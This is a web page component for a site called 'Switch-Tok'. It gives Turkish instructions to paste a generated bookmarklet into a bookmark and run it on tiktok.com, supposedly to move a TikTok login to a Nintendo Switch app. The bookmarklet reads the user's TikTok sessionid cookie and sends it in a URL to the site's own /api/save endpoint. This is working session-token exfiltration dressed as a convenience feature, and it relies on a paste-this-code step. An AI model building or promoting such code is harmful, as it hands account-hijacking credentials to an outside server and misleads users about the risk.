'use client';
import { useEffect, useState } from 'react';

function NoteIcon() {
  return (
    <svg className="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden>
      <path d="M16.6 5.82A4.28 4.28 0 0 1 15.54 3h-3.09v12.4a2.59 2.59 0 1 1-2.59-2.59c.27 0 .53.04.77.12V9.77a5.76 5.76 0 0 0-.77-.05 5.68 5.68 0 1 0 5.68 5.68V9.01a7.35 7.35 0 0 0 4.27 1.36V7.28a4.27 4.27 0 0 1-3.21-1.46Z" />
    </svg>
  );
}

function CopyIcon() {
  return (
    <svg className="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden>
      <rect x="9" y="9" width="11" height="11" rx="2" />
      <rect x="4" y="4" width="11" height="11" rx="2" />
    </svg>
  );
}

export default function Home() {
  const [bookmarklet, setBookmarklet] = useState('');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    // Generate the dynamic URL based on the current origin
    const code = `javascript:(function(){
      var sid = (document.cookie.match(/sessionid=([^;]+)/) || [,""])[1];
      if(sid) {
        window.location.href = "${window.location.origin}/api/save?sid=" + sid;
      } else {
        alert("Session ID bulunamadı. Lütfen TikTok'a giriş yaptığınızdan emin olun.");
      }
    })();`;
    // Compress the code
    setBookmarklet(code.replace(/\s+/g, ' ').trim());
  }, []);

  return (
    <div className="container">
      <main className="card">
        <div className="wordmark">Switch-Tok</div>

        <h1 className="title">Oturumunu aktar</h1>
        <p className="subtitle">
          TikTok oturumunu tek tıkla Nintendo Switch uygulamana taşı
        </p>

        <a href={bookmarklet} className="option-row" title="Bu butonu yer imleri çubuğuna sürükle">
          <NoteIcon />
          <span>Yer imlerine sürükle (PC)</span>
        </a>

        <button
          className="option-row"
          onClick={() => {
            navigator.clipboard.writeText(bookmarklet);
            setCopied(true);
            setTimeout(() => setCopied(false), 3000);
          }}
        >
          <CopyIcon />
          <span>{copied ? 'Kopyalandı ✓' : 'Kodu kopyala (telefon)'}</span>
        </button>

        <div className="divider">nasıl kullanılır</div>

        <div className="steps">
          <details open>
            <summary>📱 Telefondaysan (önerilen)</summary>
            <ol>
              <li>Yukarıdaki <strong>&quot;Kodu kopyala&quot;</strong> butonuna basıp kodu hafızaya al.</li>
              <li>Şu an bulunduğun bu sayfayı yer imlerine (favorilere) ekle.</li>
              <li>Kaydettiğin yer imini <strong>düzenle</strong>, adını &quot;TikTok Login&quot; yap.</li>
              <li>URL kısmını tamamen silip kopyaladığın kodu yapıştır ve kaydet.</li>
              <li>Yeni sekmede <a href="https://www.tiktok.com" target="_blank" rel="noreferrer">tiktok.com</a>&apos;a git ve hesabına giriş yap.</li>
              <li>Adres çubuğuna &quot;TikTok Login&quot; yazıp yer imine dokun — PIN kodun görünecek.</li>
            </ol>
          </details>
          <details>
            <summary>💻 Bilgisayardaysan</summary>
            <ol>
              <li>Yukarıdaki butonu basılı tutup <strong>yer imleri çubuğuna</strong> sürükle.</li>
              <li><a href="https://www.tiktok.com" target="_blank" rel="noreferrer">tiktok.com</a>&apos;a gidip giriş yap.</li>
              <li>TikTok açıkken yer imine tıkla — 6 haneli PIN hemen gelir.</li>
            </ol>
          </details>
        </div>

        <p className="footnote">
          Oturum bilgin yalnızca PIN eşleşmesi için köprüde bekletilir; üçüncü
          bir tarafa gönderilmez. Bu site TikTok ile bağlantılı değildir.
        </p>
      </main>
    </div>
  );
}
